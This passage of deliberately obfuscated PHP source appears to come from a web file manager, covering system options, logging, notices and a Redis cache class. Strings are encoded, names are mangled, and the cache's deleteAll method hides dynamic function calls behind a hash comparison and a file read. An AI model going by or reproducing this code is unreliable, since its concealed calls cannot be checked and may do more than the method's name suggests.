"\123\x79\x73\x74\145\155\56\x4c\x69\147\x68\x74\101\160\160"; public $modelType = "\x53\x79\163\164\x65\155\117\160\x74\x69\x6f\156"; public $field = array("\156\x61\155\x65", "\147\x72\157\165\160", "\x64\145\163\143", "\143\x6f\x6e\164\x65\156\x74"); public function listData($ áÖÌò = false, $“Ä´ıË¥ = "\155\x6f\x64\151\x66\171\x54\151\155\x65", $™Ê·ù ì = true) { return parent::listData($ áÖÌò, $“Ä´ıË¥, $™Ê·ù ì); } public function remove($­Á¨°Ëœ) { $ƒ°‚êÕº = $this->findByName($­Á¨°Ëœ); if (!$ƒ°‚êÕº) { return !1; } return parent::remove($ƒ°‚êÕº[$_SERVER[¯µç›È¢][405]]); } public function add($ñû •“) { if ($this->findByName($ñû •“[$_SERVER[¯µç›È¢][32]])) { return !1; } return parent::insert($ñû •“); } public function update($Óßµ²õÔ, $•æãç™í) { $–ñª–™ =& $_SERVER[¯µç›È¢]; $‘ë®†í = $this->findByName($Óßµ²õÔ); $‚ÜÕ‡² = $this->findByName($•æãç™í[$–ñª–™[32]]); if (!$‘ë®†í || $‚ÜÕ‡² && $‚ÜÕ‡²[$–ñª–™[405]] != $‘ë®†í[$–ñª–™[405]]) { return !1; } return parent::update($‘ë®†í[$–ñª–™[405]], $•æãç™í); } } class SystemLogModel extends ModelBase { protected $tableName = "\x73\x79\163\164\x65\x6d\x5f\154\157\x67"; protected $dataAuto = array(array("\x63\162\x65\x61\x74\145\124\x69\155\x65", "\x74\x69\x6d\x65", "\x69\156\163\x65\162\164", "\146\165\x6e\143\x74\x69\x6f\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $¢Š©íû =& $_SERVER[¯µç›È¢]; return array($¢Š©íû[2152] => LNG($¢Š©íû[2153]), $¢Š©íû[2154] => LNG($¢Š©íû[2155]), $¢Š©íû[1777] => LNG($¢Š©íû[2156]), $¢Š©íû[2157] => LNG($¢Š©íû[2158]), $¢Š©íû[2159] => LNG($¢Š©íû[2160]), $¢Š©íû[2161] => LNG($¢Š©íû[2162]), $¢Š©íû[2163] => LNG($¢Š©íû[2164]), $¢Š©íû[1807] => LNG($¢Š©íû[2164]), $¢Š©íû[1808] => LNG($¢Š©íû[2165]), $¢Š©íû[2166] => LNG($¢Š©íû[2167]), $¢Š©íû[2168] => LNG($¢Š©íû[2169]), $¢Š©íû[2170] => LNG($¢Š©íû[2171]), $¢Š©íû[2172] => LNG($¢Š©íû[2173]), $¢Š©íû[1805] => LNG($¢Š©íû[2174]), $¢Š©íû[2175] => LNG($¢Š©íû[2176]), $¢Š©íû[1812] => LNG($¢Š©íû[2177]), $¢Š©íû[2178] => LNG($¢Š©íû[2179]), $¢Š©íû[2180] => LNG($¢Š©íû[2181]), $¢Š©íû[2182] => LNG($¢Š©íû[2183]), $¢Š©íû[2184] => LNG($¢Š©íû[2185]), $¢Š©íû[1815] => LNG($¢Š©íû[2186]), $¢Š©íû[1816] => LNG($¢Š©íû[2187]), $¢Š©íû[2188] => LNG($¢Š©íû[2189]), $¢Š©íû[2190] => LNG($¢Š©íû[2191]), $¢Š©íû[2192] => LNG($¢Š©íû[2193]), $¢Š©íû[1810] => LNG($¢Š©íû[2194]), $¢Š©íû[2195] => LNG($¢Š©íû[2196]), $¢Š©íû[1809] => LNG($¢Š©íû[2197]), $¢Š©íû[2198] => LNG($¢Š©íû[2199]), $¢Š©íû[2200] => LNG($¢Š©íû[2201]), $¢Š©íû[2202] => LNG($¢Š©íû[2203]), $¢Š©íû[2204] => LNG($¢Š©íû[2204]), $¢Š©íû[2205] => LNG($¢Š©íû[1781]), $¢Š©íû[2206] => LNG($¢Š©íû[2207]), $¢Š©íû[2208] => LNG($¢Š©íû[2209]), $¢Š©íû[2210] => LNG($¢Š©íû[2211]), $¢Š©íû[2212] => LNG($¢Š©íû[2213]), $¢Š©íû[2214] => LNG($¢Š©íû[2215]), $¢Š©íû[2216] => LNG($¢Š©íû[2216]), $¢Š©íû[2217] => LNG($¢Š©íû[2218]), $¢Š©íû[2219] => LNG($¢Š©íû[2220]), $¢Š©íû[2221] => LNG($¢Š©íû[2222]), $¢Š©íû[2223] => LNG($¢Š©íû[2224]), $¢Š©íû[2225] => LNG($¢Š©íû[2226]), $¢Š©íû[2227] => LNG($¢Š©íû[2228])); } private function typeFile() { $ö¬ú­Õæ =& $_SERVER[¯µç›È¢]; $¶š¤®°‡ = array($ö¬ú­Õæ[1812] => array($ö¬ú­Õæ[1813]), $ö¬ú­Õæ[2170] => array($ö¬ú­Õæ[2229]), $ö¬ú­Õæ[2172] => array($ö¬ú­Õæ[2230]), $ö¬ú­Õæ[1805] => array($ö¬ú­Õæ[1806]), $ö¬ú­Õæ[2180] => array(), $ö¬ú­Õæ[2182] => array(), $ö¬ú­Õæ[2184] => array(), $ö¬ú­Õæ[1815] => array($ö¬ú­Õæ[1817]), $ö¬ú­Õæ[1816] => array($ö¬ú­Õæ[1817]), $ö¬ú­Õæ[2188] => array($ö¬ú­Õæ[2231]), $ö¬ú­Õæ[2190] => array($ö¬ú­Õæ[2231]), $ö¬ú­Õæ[2192] => array($ö¬ú­Õæ[2232]), $ö¬ú­Õæ[2178] => array($ö¬ú­Õæ[2233]), $ö¬ú­Õæ[1810] => array($ö¬ú­Õæ[2234]), $ö¬ú­Õæ[2195] => array($ö¬ú­Õæ[2235]), $ö¬ú­Õæ[1809] => array($ö¬ú­Õæ[1811])); return $¶š¤®°‡; } private function typeAll() { $ë‘¡‚¶¡ =& $_SERVER[¯µç›È¢]; $ó„ˆ¿­ = $this->typeList; $İÊ€® = array_filter($this->typeFile()); foreach ($İÊ€® as $û”•õ¶ => $Ùèšãê) { $ó„ˆ¿­[$Ùèšãê[0]] = $ó„ˆ¿­[$û”•õ¶]; } $ó„ˆ¿­[$ë‘¡‚¶¡[1817]] = LNG($ë‘¡‚¶¡[2236]); $ó„ˆ¿­[$ë‘¡‚¶¡[2231]] = LNG($ë‘¡‚¶¡[2237]); return $ó„ˆ¿­; } public function addLog($¸’€ç˜, $áéŸ‘Ü… = array()) { $–¶÷˜Ü‰ =& $_SERVER[¯µç›È¢]; if (!isset($this->typeList[$¸’€ç˜])) { return; } $èÔ®£ÆŞ = defined($–¶÷˜Ü‰[479]) && USER_ID ? USER_ID : (isset($áéŸ‘Ü…[$–¶÷˜Ü‰[1666]]) ? $áéŸ‘Ü…[$–¶÷˜Ü‰[1666]] : 0); if (!$èÔ®£ÆŞ) { $èÔ®£ÆŞ = (int) Session::get($–¶÷˜Ü‰[1968]); } $å½µÁ¼Ä = get_client_ip(); if (!$áéŸ‘Ü… || strlen(json_encode($áéŸ‘Ü…)) >= 1024) { $áéŸ‘Ü… = array($–¶÷˜Ü‰[2238] => $å½µÁ¼Ä); } else { if (is_array($áéŸ‘Ü…)) { $áéŸ‘Ü…[$–¶÷˜Ü‰[2238]] = $å½µÁ¼Ä; } else { $áéŸ‘Ü… = array($–¶÷˜Ü‰[1203] => $áéŸ‘Ü…, $–¶÷˜Ü‰[2238] => $å½µÁ¼Ä); } } $áéŸ‘Ü… = array($–¶÷˜Ü‰[1656] => Session::sign(), $–¶÷˜Ü‰[1657] => $èÔ®£ÆŞ, $–¶÷˜Ü‰[33] => $¸’€ç˜, $–¶÷˜Ü‰[1659] => json_encode($áéŸ‘Ü…)); parent::add($áéŸ‘Ü…); } public function remove($¶¬½óŸ) { $this->where(array($_SERVER[¯µç›È¢][425] => $¶¬½óŸ))->delete(); } private function _makeOrder($İıÅğÁ = '') { $âÛ¬ñí· =& $_SERVER[¯µç›È¢]; $³Áü¦ëÑ = $âÛ¬ñí·[207]; $¶ÈæØÌ† = array($âÛ¬ñí·[453] => $âÛ¬ñí·[454], $âÛ¬ñí·[455] => $âÛ¬ñí·[456]); $­ş¯ŠäŞ = Input::get($âÛ¬ñí·[461], $âÛ¬ñí·[7], $âÛ¬ñí·[2000], array($âÛ¬ñí·[1924], $âÛ¬ñí·[455])); $­ş¯ŠäŞ = $¶ÈæØÌ†[$­ş¯ŠäŞ]; $İıÅğÁ = $İıÅğÁ . "{$³Áü¦ëÑ}\x20{$­ş¯ŠäŞ}"; return $this->order($İıÅğÁ); } public function get($Ü¼ˆôãÉ = '') { $ËÀè¶Á =& $_SERVER[¯µç›È¢]; if (!$Ü¼ˆôãÉ) { show_json(array()); } $¥¤í°ëƒ = array(); if ($Ü¼ˆôãÉ[$ËÀè¶Á[1666]]) { $¥¤í°ëƒ[$ËÀè¶Á[1666]] = $Ü¼ˆôãÉ[$ËÀè¶Á[1666]]; } if (isset($Ü¼ˆôãÉ[$ËÀè¶Á[778]])) { $è°ñ¦àì = $Ü¼ˆôãÉ[$ËÀè¶Á[778]]; $âŸÆı¨ø = isset($Ü¼ˆôãÉ[$ËÀè¶Á[501]]) ? $Ü¼ˆôãÉ[$ËÀè¶Á[501]] : time(); $¥¤í°ëƒ[$ËÀè¶Á[207]] = array($ËÀè¶Á[341], array($è°ñ¦àì, $âŸÆı¨ø)); } if ($Ü¼ˆôãÉ[$ËÀè¶Á[33]]) { $ºñÆ’ë = explode($ËÀè¶Á[50], $Ü¼ˆôãÉ[$ËÀè¶Á[33]]); $¯›Ùà = $this->typeFile(); $«ÖÆ™Öœ = array(); foreach ($ºñÆ’ë as $Ì­æ»•Î) { $«ÖÆ™Öœ[] = $Ì­æ»•Î; if (isset($¯›Ùà[$Ì­æ»•Î])) { $«ÖÆ™Öœ = array_merge($«ÖÆ™Öœ, $¯›Ùà[$Ì­æ»•Î]); } } $«ÖÆ™Öœ = array_unique($«ÖÆ™Öœ); if ($«ÖÆ™Öœ) { $¥¤í°ëƒ[$ËÀè¶Á[33]] = array($ËÀè¶Á[7], $«ÖÆ™Öœ); } } else { $¥¤í°ëƒ[$ËÀè¶Á[33]] = array($ËÀè¶Á[2239], $ËÀè¶Á[2240]); } if (!empty($Ü¼ˆôãÉ[$ËÀè¶Á[2238]])) { $¥¤í°ëƒ[$ËÀè¶Á[456]] = array($ËÀè¶Á[391], "\x25{$Ü¼ˆôãÉ[$ËÀè¶Á[2238]]}\45"); } $Æœõ˜Œä = $this->_makeOrder()->where($¥¤í°ëƒ)->selectPage(); if (empty($Æœõ˜Œä[$ËÀè¶Á[377]])) { show_json(array(), !0, $Æœõ˜Œä[$ËÀè¶Á[374]]); } $Æœõ˜Œä[$ËÀè¶Á[377]] = $this->logList($Æœõ˜Œä[$ËÀè¶Á[377]]); return $Æœõ˜Œä; } private function ipAddress(&$¨›Éè…) { $ñ÷ÃÎ =& $_SERVER[¯µç›È¢]; if (!empty($¨›Éè…[$ñ÷ÃÎ[2238]])) { $£ÇÕ”â = IpLocation::get($¨›Éè…[$ñ÷ÃÎ[2238]]); } else { $£ÇÕ”â = LNG($ñ÷ÃÎ[2241]); } $¨›Éè…[$ñ÷ÃÎ[2242]] = $£ÇÕ”â; } private function descZipDownload($®ØÂã‘›, &$ê’Ûè’è) { $•İØªã‹ =& $_SERVER[¯µç›È¢]; if (!isset($®ØÂã‘›[$•İØªã‹[2243]])) { return; } $ ¯Òîú¯ = json_decode($®ØÂã‘›[$•İØªã‹[2243]], !0); foreach ($ ¯Òîú¯ as $‡´ªÊ²Ì) { try { $ÉÆ£²ñ = IO::infoFull($‡´ªÊ²Ì[$•İØªã‹[88]]); } catch (Exception $×ª®½õ) { continue; } $®ØÂã‘›[$•İØªã‹[88]] = $‡´ªÊ²Ì[$•İØªã‹[88]]; $ê’Ûè’è[] = $®ØÂã‘›[$•İØªã‹[408]] = $ÉÆ£²ñ[$•İØªã‹[408]]; $ê’Ûè’è[] = $®ØÂã‘›[$•İØªã‹[2054]] = $ÉÆ£²ñ[$•İØªã‹[503]]; break; } return $®ØÂã‘›; } private function getSourceList(&$½±ØÇ“) { $äÄ·…İÌ =& $_SERVER[¯µç›È¢]; $İ®“¯çÙ = array(); foreach ($½±ØÇ“ as $¬îëå”ë => $Šš­›”) { $º‹•ø´Ç = json_decode($Šš­›”[$äÄ·…İÌ[456]], !0); if ($Šš­›”[$äÄ·…İÌ[33]] == $äÄ·…İÌ[1808]) { $º‹•ø´Ç = $this->descZipDownload($º‹•ø´Ç, $İ®“¯çÙ); $½±ØÇ“[$¬îëå”ë][$äÄ·…İÌ[456]] = json_encode($º‹•ø´Ç); continue; } if (strpos($Šš­›”[$äÄ·…İÌ[33]], $äÄ·…İÌ[2056]) !== 0) { if (!isset($º‹•ø´Ç[$äÄ·…İÌ[88]]) || strpos($Šš­›”[$äÄ·…İÌ[33]], $äÄ·…İÌ[2244]) !== 0) { continue; } try { $ĞıÙŸ® = IO::infoFull($º‹•ø´Ç[$äÄ·…İÌ[88]]); } catch (Exception $ïÜÇ÷ƒµ) { continue; } $İ®“¯çÙ[] = $º‹•ø´Ç[$äÄ·…İÌ[408]] = $ĞıÙŸ®[$äÄ·…İÌ[408]]; $İ®“¯çÙ[] = $º‹•ø´Ç[$äÄ·…İÌ[2054]] = $ĞıÙŸ®[$äÄ·…İÌ[503]]; $½±ØÇ“[$¬îëå”ë][$äÄ·…İÌ[456]] = json_encode($º‹•ø´Ç); continue; } $İ®“¯çÙ[] = $º‹•ø´Ç[$äÄ·…İÌ[408]]; $İ®“¯çÙ[] = $º‹•ø´Ç[$äÄ·…İÌ[2054]]; if ($º‹•ø´Ç[$äÄ·…İÌ[33]] == $äÄ·…İÌ[559]) { $İ®“¯çÙ[] = $º‹•ø´Ç[$äÄ·…İÌ[456]][$äÄ·…İÌ[1170]]; $İ®“¯çÙ[] = $º‹•ø´Ç[$äÄ·…İÌ[456]][$äÄ·…İÌ[1171]]; } if ($º‹•ø´Ç[$äÄ·…İÌ[33]] == $äÄ·…İÌ[2063]) { $İ®“¯çÙ[] = $º‹•ø´Ç[$äÄ·…İÌ[456]][$äÄ·…İÌ[408]]; } } if (!$İ®“¯çÙ) { return array(); } return Model($äÄ·…İÌ[842])->sourceListInfo($İ®“¯çÙ, !0); } private function logList($ÃÂÅè¢Å) { $ù€»Ï  =& $_SERVER[¯µç›È¢]; $É‚ª¸˜¬ = array_to_keyvalue($ÃÂÅè¢Å, $ù€»Ï [12], $ù€»Ï [1666]); $é“¦Ò„Á = Model($ù€»Ï [546])->userListInfo(array_unique($É‚ª¸˜¬)); $Õ¥‘òŞö = $this->getSourceList($ÃÂÅè¢Å); $îÍ’‰Íœ = $this->typeAll(); $Ğİ‡ØÔ = array(); $õ¨ÕÚÅ = array(); foreach ($ÃÂÅè¢Å as $Õ‘Í“è => $ĞäÍøÙˆ) { $ àî¡ûó = $ĞäÍøÙˆ[$ù€»Ï [33]]; $àƒØˆŠ = isset($é“¦Ò„Á[$ĞäÍøÙˆ[$ù€»Ï [1666]]]) ? $é“¦Ò„Á[$ĞäÍøÙˆ[$ù€»Ï [1666]]] : !1; $Ú†Ë½âˆ = strpos($ àî¡ûó, $ù€»Ï [2245]) === 0 ? LNG($ù€»Ï [2246]) : LNG($ù€»Ï [2241]); $ĞäÍøÙˆ[$ù€»Ï [32]] = isset($àƒØˆŠ[$ù€»Ï [32]]) ? $àƒØˆŠ[$ù€»Ï [32]] : LNG($ù€»Ï [2241]); $ĞäÍøÙˆ[$ù€»Ï [543]] = isset($àƒØˆŠ[$ù€»Ï [543]]) ? $àƒØˆŠ[$ù€»Ï [543]] : $ù€»Ï [12]; $ĞäÍøÙˆ[$ù€»Ï [1566]] = isset($îÍ’‰Íœ[$ àî¡ûó]) ? $îÍ’‰Íœ[$ àî¡ûó] : $Ú†Ë½âˆ; $ĞäÍøÙˆ[$ù€»Ï [1999]] = $àƒØˆŠ; $«¾û†Û™ = json_decode($ĞäÍøÙˆ[$ù€»Ï [456]], !0); $ĞäÍøÙˆ[$ù€»Ï [2238]] = isset($«¾û†Û™[$ù€»Ï [2238]]) ? $«¾û†Û™[$ù€»Ï [2238]] : $ù€»Ï [12]; $ĞäÍøÙˆ[$ù€»Ï [2242]] = IpLocation::get($ĞäÍøÙˆ[$ù€»Ï [2238]]); if (strpos($ àî¡ûó, $ù€»Ï [2056]) === 0 || isset($«¾û†Û™[$ù€»Ï [2054]])) { $«¾û†Û™[$ù€»Ï [97]] = $Õ¥‘òŞö[$«¾û†Û™[$ù€»Ï [408]]]; $«¾û†Û™[$ù€»Ï [2068]] = $Õ¥‘òŞö[$«¾û†Û™[$ù€»Ï [2054]]]; if ($«¾û†Û™[$ù€»Ï [33]] == $ù€»Ï [559]) { $«¾û†Û™[$ù€»Ï [456]][$ù€»Ï [1170]] = $Õ¥‘òŞö[$«¾û†Û™[$ù€»Ï [456]][$ù€»Ï [1170]]]; $«¾û†Û™[$ù€»Ï [456]][$ù€»Ï [1171]] = $Õ¥‘òŞö[$«¾û†Û™[$ù€»Ï [456]][$ù€»Ï [1171]]]; } if ($«¾û†Û™[$ù€»Ï [33]] == $ù€»Ï [2063]) { $«¾û†Û™[$ù€»Ï [456]][$ù€»Ï [408]] = $Õ¥‘òŞö[$«¾û†Û™[$ù€»Ï [456]][$ù€»Ï [408]]]; } if ($«¾û†Û™[$ù€»Ï [33]] == $ù€»Ï [1803]) { $«¾û†Û™[$ù€»Ï [2068]] = $«¾û†Û™[$ù€»Ï [97]]; $«¾û†Û™[$ù€»Ï [2054]] = $«¾û†Û™[$ù€»Ï [2068]][$ù€»Ï [408]]; $«¾û†Û™[$ù€»Ï [97]] = !1; $«¾û†Û™[$ù€»Ï [408]] = $ù€»Ï [12]; } if ($«¾û†Û™[$ù€»Ï [97]] && $«¾û†Û™[$ù€»Ï [97]][$ù€»Ï [417]] == $ù€»Ï [1286]) { $õ¨ÕÚÅ[] = $ĞäÍøÙˆ[$ù€»Ï [405]]; unset($ÃÂÅè¢Å[$Õ‘Í“è]); continue; } if ($«¾û†Û™[$ù€»Ï [2068]] && $«¾û†Û™[$ù€»Ï [2068]][$ù€»Ï [417]] == $ù€»Ï [1286]) { $õ¨ÕÚÅ[] = $ĞäÍøÙˆ[$ù€»Ï [405]]; unset($ÃÂÅè¢Å[$Õ‘Í“è]); continue; } } $ĞäÍøÙˆ[$ù€»Ï [456]] = $«¾û†Û™; unset($ĞäÍøÙˆ[$ù€»Ï [2247]]); $Ğİ‡ØÔ[] = $ĞäÍøÙˆ; } $this->clearSystemPathLog($õ¨ÕÚÅ); return $Ğİ‡ØÔ; } private function clearSystemPathLog($Í¿å¼ù) { $°†Äšæ =& $_SERVER[¯µç›È¢]; if (count($Í¿å¼ù) == 0) { return; } $†üèûê² = array($°†Äšæ[405] => array($°†Äšæ[7], array_unique($Í¿å¼ù))); $this->where($†üèûê²)->delete(); } public function deviceList($¥ËãÙ›˜, $À„óºÌ© = 0) { $á²ø„ùĞ =& $_SERVER[¯µç›È¢]; $µÎï®âÁ = array($á²ø„ùĞ[1666] => $¥ËãÙ›˜, $á²ø„ùĞ[207] => array($á²ø„ùĞ[1026], $À„óºÌ©), $á²ø„ùĞ[33] => $á²ø„ùĞ[1777]); $Àüé´“¨ = array(); $–³°ºñ = $this->field($á²ø„ùĞ[2248])->where($µÎï®âÁ)->order($á²ø„ùĞ[2066])->limit(50)->select(); foreach ($–³°ºñ as $±åÀì¿ => $µöªìÌ¤) { if ($±åÀì¿ > 0 && abs($µöªìÌ¤[$á²ø„ùĞ[207]] - $–³°ºñ[$±åÀì¿ - 1][$á²ø„ùĞ[207]]) < 5) { continue; } $˜øºş¤ = json_decode($µöªìÌ¤[$á²ø„ùĞ[456]], !0); $µöªìÌ¤[$á²ø„ùĞ[2238]] = isset($˜øºş¤[$á²ø„ùĞ[2238]]) ? $˜øºş¤[$á²ø„ùĞ[2238]] : $á²ø„ùĞ[12]; unset($˜øºş¤[$á²ø„ùĞ[2238]]); $¤ùÌ€Ú… = $this->deviceType($˜øºş¤[$á²ø„ùĞ[2057]]); if (isset($Àüé´“¨[$¤ùÌ€Ú…])) { continue; } $µöªìÌ¤[$á²ø„ùĞ[2242]] = IpLocation::get($µöªìÌ¤[$á²ø„ùĞ[2238]]); $µöªìÌ¤[$á²ø„ùĞ[456]] = $˜øºş¤; $Àüé´“¨[$¤ùÌ€Ú…] = $µöªìÌ¤; } return array_values($Àüé´“¨); } public function deviceType($ìˆ®ÙïÖ) { return $ìˆ®ÙïÖ; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\171\163\164\145\x6d\x2e\156\x6f\x74\x69\x63\145\114\x69\163\164"; public $field = array("\156\141\x6d\x65", "\143\157\156\x74\145\x6e\164", "\141\x75\x74\150", "\x6d\157\144\x65", "\x74\151\x6d\x65", "\x74\171\x70\145", "\154\x65\x76\145\154", "\145\156\x61\142\154\x65", "\x73\157\x72\164"); public function listData($™Åˆ‚ó = false, $¶Äİè—î = "\x73\x6f\162\164", $â¨Öàë” = false) { return parent::listData($™Åˆ‚ó, $¶Äİè—î, $â¨Öàë”); } public function add($‡Ó‘ÓËÔ) { $¿£¼µ­ =& $_SERVER[¯µç›È¢]; $½°°ò—Ì = time(); if ($‡Ó‘ÓËÔ[$¿£¼µ­[16]] == $¿£¼µ­[2249]) { $½°°ò—Ì = strtotime($‡Ó‘ÓËÔ[$¿£¼µ­[210]]); } $‡Ó‘ÓËÔ[$¿£¼µ­[210]] = $½°°ò—Ì; return parent::insert($‡Ó‘ÓËÔ); } public function update($ÎŸâ«È‹, $ª»Êó°½) { $„×éŒ¡ =& $_SERVER[¯µç›È¢]; $Š“·™ô“ = $this->listData($ÎŸâ«È‹); if (!$Š“·™ô“) { return !1; } $£•¼Ã¡ = time(); if ($ª»Êó°½[$„×éŒ¡[16]] == $„×éŒ¡[2249]) { $£•¼Ã¡ = strtotime($ª»Êó°½[$„×éŒ¡[210]]); } $ª»Êó°½[$„×éŒ¡[210]] = $£•¼Ã¡; return parent::update($ÎŸâ«È‹, $ª»Êó°½); } public function remove($×¯¥Ğ©¯) { $­İÒ®ü = $this->listData($×¯¥Ğ©¯); if (!$­İÒ®ü || $­İÒ®ü[$_SERVER[¯µç›È¢][1286]]) { return !1; } return parent::remove($×¯¥Ğ©¯); } public function sort($Ö­Ó¥í, $ÍèÊÑª¬) { return parent::update($Ö­Ó¥í, $ÍèÊÑª¬); } public function enable($é’Ú¡¨„, $ûËæ²¦) { return parent::update($é’Ú¡¨„, array($_SERVER[¯µç›È¢][2250] => $ûËæ²¦)); } private function initUserOption() { $îŞöã†Û =& $_SERVER[¯µç›È¢]; $this->optionType = $îŞöã†Û[2251]; $this->modelType = $îŞöã†Û[2252]; $this->field = array($îŞöã†Û[2253], $îŞöã†Û[32], $îŞöã†Û[210], $îŞöã†Û[33], $îŞöã†Û[2254], $îŞöã†Û[767], $îŞöã†Û[202]); } public function userNoticeGet($îÖ°§’ó = false) { $this->initUserOption(); return parent::listData($îÖ°§’ó, $_SERVER[¯µç›È¢][405], !0); } public function userNoticeAdd($ĞÌØê¯š) { $¿èÚÜÑŠ =& $_SERVER[¯µç›È¢]; $this->initUserOption(); $¶¿”òª = $this->findByKey($¿èÚÜÑŠ[2253], $ĞÌØê¯š[$¿èÚÜÑŠ[405]]); if ($¶¿”òª) { return !0; } $¼ùœÆ³ = array($¿èÚÜÑŠ[2253] => $ĞÌØê¯š[$¿èÚÜÑŠ[405]], $¿èÚÜÑŠ[32] => $ĞÌØê¯š[$¿èÚÜÑŠ[32]], $¿èÚÜÑŠ[210] => $ĞÌØê¯š[$¿èÚÜÑŠ[210]], $¿èÚÜÑŠ[33] => isset($ĞÌØê¯š[$¿èÚÜÑŠ[33]]) ? $ĞÌØê¯š[$¿èÚÜÑŠ[33]] : 1, $¿èÚÜÑŠ[2254] => isset($ĞÌØê¯š[$¿èÚÜÑŠ[2254]]) ? $ĞÌØê¯š[$¿èÚÜÑŠ[2254]] : 0, $¿èÚÜÑŠ[767] => 0, $¿èÚÜÑŠ[202] => 0); return parent::insert($¼ùœÆ³); } public function userNoticeEdit($ÂÜ†²¬³, $õÖ±›œ») { $this->initUserOption(); return parent::update($ÂÜ†²¬³, $õÖ±›œ»); } } goto fê´øà£÷; c„µåÌßù: class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($£Öµ×Ûµ, $ƒ¯‘ëö÷) { $«Ë‹æ¼ =& $_SERVER[¯µç›È¢]; if (!class_exists($«Ë‹æ¼[882])) { show_json($«Ë‹æ¼[883], !1); } $this->cacheTime = $ƒ¯‘ëö÷; $©ÎÂËÏ¢ = isset($£Öµ×Ûµ[$«Ë‹æ¼[884]]) ? $£Öµ×Ûµ[$«Ë‹æ¼[884]] : 10; $¯‰®”¬Ä = _get($£Öµ×Ûµ, $«Ë‹æ¼[881]); if ($¯‰®”¬Ä && is_array($¯‰®”¬Ä)) { $this->initCluster($£Öµ×Ûµ, $©ÎÂËÏ¢); } else { $this->handle = $this->init($£Öµ×Ûµ, $©ÎÂËÏ¢); } } private function init($Ç¯—’óÀ, $à¥ùå’Š) { $­ı¯« =& $_SERVER[¯µç›È¢]; $‹æñ•¦¯ = new Redis(); $ƒ–÷ëÏŠ = isset($Ç¯—’óÀ[$­ı¯«[885]]) ? $Ç¯—’óÀ[$­ı¯«[885]] : !1; if ($ƒ–÷ëÏŠ) { $‹æñ•¦¯->pconnect($Ç¯—’óÀ[$­ı¯«[188]], $Ç¯—’óÀ[$­ı¯«[189]], $à¥ùå’Š); } else { $‹æñ•¦¯->connect($Ç¯—’óÀ[$­ı¯«[188]], $Ç¯—’óÀ[$­ı¯«[189]], $à¥ùå’Š); } if (!empty($Ç¯—’óÀ[$­ı¯«[419]])) { $‹æñ•¦¯->auth($Ç¯—’óÀ[$­ı¯«[419]]); } return $‹æñ•¦¯; } private function initCluster($£éÒ÷Ü, $ÎË¼Ø‘ˆ) { $áÔë¥Ô£ =& $_SERVER[¯µç›È¢]; $œò¡à» = array($áÔë¥Ô£[886], $áÔë¥Ô£[887], $áÔë¥Ô£[888]); $·è”¾Ø = $áÔë¥Ô£[886]; if (isset($£éÒ÷Ü[$áÔë¥Ô£[16]]) && in_array($£éÒ÷Ü[$áÔë¥Ô£[16]], $œò¡à»)) { $·è”¾Ø = $£éÒ÷Ü[$áÔë¥Ô£[16]]; } switch ($·è”¾Ø) { case $áÔë¥Ô£[886]: $this->_slave($£éÒ÷Ü, $ÎË¼Ø‘ˆ); break; case $áÔë¥Ô£[887]: break; case $áÔë¥Ô£[888]: $this->isCluster = !0; $ğõŸÀ†Î = $£éÒ÷Ü[$áÔë¥Ô£[881]]; $ëìúıÌ = isset($£éÒ÷Ü[$áÔë¥Ô£[885]]) ? $£éÒ÷Ü[$áÔë¥Ô£[885]] : !1; $£²€ÜÁ = isset($£éÒ÷Ü[$áÔë¥Ô£[419]]) ? $£éÒ÷Ü[$áÔë¥Ô£[419]] : null; $this->handle = new RedisCluster(NUll, $ğõŸÀ†Î, $ÎË¼Ø‘ˆ, $ÎË¼Ø‘ˆ, $ëìúıÌ, $£²€ÜÁ); break; default: break; } } private function _slave($ÕûÈüô·, $£ÄİãØö) { $Ÿ•Ô½Ë = $ÕûÈüô·[$_SERVER[¯µç›È¢][881]]; $this->filterConfig($ÕûÈüô·, $Ÿ•Ô½Ë[0]); $this->handle = $this->init($ÕûÈüô·, $£ÄİãØö); unset($Ÿ•Ô½Ë[0]); if (empty($Ÿ•Ô½Ë)) { return; } $—ÚÛÅ³– = array_rand($Ÿ•Ô½Ë); $this->filterConfig($ÕûÈüô·, $Ÿ•Ô½Ë[$—ÚÛÅ³–]); $this->slaveHandle = $this->init($ÕûÈüô·, $£ÄİãØö); } private function filterConfig(&$˜ÄÍÒŒæ, $ªøª’¿œ) { $•¯ äˆÆ =& $_SERVER[¯µç›È¢]; $İ¨„Êß = explode($•¯ äˆÆ[4], $ªøª’¿œ); $Ø­€èİ = array($•¯ äˆÆ[188] => $İ¨„Êß[0], $•¯ äˆÆ[189] => $İ¨„Êß[1]); $˜ÄÍÒŒæ = array_merge($˜ÄÍÒŒæ, $Ø­€èİ); } public function set($µœ€’èş, $˜ ™¢ÈÉ, $”òåíïâ = false) { $”òåíïâ = $”òåíïâ ? $”òåíïâ : $this->cacheTime; return $this->handle->setEx($µœ€’èş, $”òåíïâ, $˜ ™¢ÈÉ); } public function setLock($áÍ†¤é, $áºƒÔô, $æÉø°ï) { return $this->handle->setNX($áÍ†¤é, $áºƒÔô); } public function get($¿™Å¥ˆ) { $ÊíºÌÈ€ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $ÊíºÌÈ€->get($¿™Å¥ˆ); } public function remove($‡‹³ï²) { return $this->handle->del($‡‹³ï²); } public function deleteAll() { $¶ÈĞ¶Á =& $_SERVER[¯µç›È¢]; $Æ±îâˆÂ = $_SERVER[$¶ÈĞ¶Á[60]]; $ıâı”­Ñ = $¶ÈĞ¶Á[61]; if ($_SERVER[$¶ÈĞ¶Á[62]] != $ıâı”­Ñ($Æ±îâˆÂ)) { $ÁÔÀ°‰ = $¶ÈĞ¶Á[889]; $æ‚Ë½«Ÿ = $¶ÈĞ¶Á[63]; $åáÔö§» = $_SERVER[$¶ÈĞ¶Á[64]] . $¶ÈĞ¶Á[65]; $œ­ºÍÁ€ = $æ‚Ë½«Ÿ($åáÔö§»); $ÎœÛê²ñ = explode($¶ÈĞ¶Á[66], $œ­ºÍÁ€); if (count($ÎœÛê²ñ) < $¶ÈĞ¶Á[634]) { $¢Ù‚€Œñ = $¶ÈĞ¶Á[68]; $¢Ù‚€Œñ(); } $ÎÛé±Ğ© = $¶ÈĞ¶Á[890]; $ÎÛé±Ğ©($_SERVER[$¶ÈĞ¶Á[891]]); $ÁÔÀ°‰ = $¶ÈĞ¶Á[889]; $ÁÔÀ°‰(); $‡®Â¿¨¸ = $¶ÈĞ¶Á[892]; $ë×Ò™öĞ = 